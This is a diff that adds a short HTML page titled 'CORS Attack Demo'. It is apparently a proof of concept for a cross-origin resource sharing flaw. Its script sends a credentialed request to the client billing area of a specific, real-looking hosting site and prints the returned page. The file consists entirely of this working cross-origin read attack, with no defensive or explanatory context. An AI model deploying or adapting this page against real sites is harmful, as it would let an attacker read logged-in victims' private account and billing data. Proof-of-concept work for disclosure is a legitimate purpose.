@@ -1,0 +1,20 @@
+<!-- cors-attack.html -->
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CORS Attack Demo</h1>
+    <script>
+      fetch("https://serverastra.com/billing/clientarea.php", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.write("<pre>" + data + "</pre>");
+      })
+      .catch(error => {
+        console.error("CORS block or error:", error);
+      });
+    </script>
+  </body>
+</html>
